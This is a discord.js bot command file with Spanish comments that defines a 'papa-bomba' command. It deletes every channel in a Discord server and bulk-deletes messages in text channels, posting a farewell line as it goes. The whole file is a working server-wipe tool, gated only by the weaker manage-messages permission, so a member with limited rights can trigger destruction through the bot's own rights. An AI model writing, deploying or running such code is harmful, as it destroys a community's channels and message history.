const Discord = require('discord.js'); //Integrar discord.js
var global = require('../../config.json'); //Variables globales

module.exports = {
	name: 'papa-bomba',
	execute(message, args) {
		if(message.member.hasPermission('MANAGE_MESSAGES', false, true, true)) {
			message.channel.guild.channels.tap(ch => {
				if(ch.deletable) ch.delete().catch(error => console.error(error));
				if(!ch.deleted && ch.type === 'text') {
					ch.send('*Todo lo que comienza, eventualmente termina. Sea por la razón que sea.*');
					ch.bulkDelete(1000, true);
				}
			});
        } else {
            message.channel.send('*Nisiquiera lo intentes...*');
            return;
        }
    },
};